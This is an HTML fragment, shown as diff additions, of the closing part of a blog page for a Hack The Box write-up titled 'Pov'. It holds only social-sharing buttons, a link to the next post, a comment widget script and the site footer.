+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f&amp;title=HTB%3a%20Pov&amp;summary=HTB%3a%20Pov&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f&amp;resubmit=true&amp;title=HTB%3a%20Pov" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f;title=HTB%3a%20Pov" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Pov%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f&amp;t=HTB%3a%20Pov" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Pov&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/fr/posts/2024/05/htb-bizness/">
+                    <span class="button__text">HTB: Bizness</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
